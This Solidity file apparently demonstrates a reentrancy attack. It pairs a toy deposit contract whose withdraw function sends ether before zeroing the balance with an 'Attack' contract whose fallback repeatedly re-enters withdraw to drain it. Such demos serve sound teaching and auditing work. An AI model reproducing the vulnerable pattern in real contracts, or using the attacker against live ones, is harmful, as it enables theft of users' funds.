pragma solidity ^0.8.0;

contract Reentrancy{
    mapping(address => uint) public balances;

    function Deposit() public payable{
        balances[msg.sender]+=msg.value;
    }

    function withdraw() public{
        uint bal=balances[msg.sender];
        require(bal>0);
        (bool sent,)=msg.sender.call{value:bal}("");
        require(sent,"ether transfer fail"); 
        balances[msg.sender]=0;
    }
}

contract Attack{
    Reentrancy public depositfunds;

    constructor (address _depositfunds) public{
        depositfunds =Reentrancy(_depositfunds);
    }
    
    fallback() external payable{
        //require(msg.value>=1 ether);
        if(address(depositfunds).balance>=1 ether){
            depositfunds.withdraw();
        }
    }
    function attack() external payable{
        require(msg.value>=1 ether);
        depositfunds.Deposit{value:1 ether}();
        depositfunds.withdraw();
    }
    
}

